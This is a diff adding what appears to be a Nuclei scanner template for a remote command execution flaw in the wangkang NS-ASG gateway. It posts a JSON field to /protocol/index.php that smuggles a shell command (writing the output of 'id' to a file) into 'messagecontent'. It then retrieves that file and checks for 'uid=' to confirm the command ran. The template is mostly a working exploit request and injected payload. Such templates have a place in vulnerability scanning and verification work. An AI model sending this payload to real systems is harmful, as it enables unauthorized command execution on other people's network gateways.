@@ -1,0 +1,43 @@
+id: wangkang-NS-ASG-addipsec-rce
+
+info:
+  name: wangkang-NS-ASG-addipsec-rce
+  author: HuanXiong
+  severity: critical
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /protocol/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Ua-Cpu: AMD64
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 76
+
+        jsoncontent={"protocolType":"addipsec","messagecontent":"1\";id>{{username}}.txt;\""}
+
+      - |
+        GET /protocol/{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Ua-Cpu: AMD64
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'uid=')"
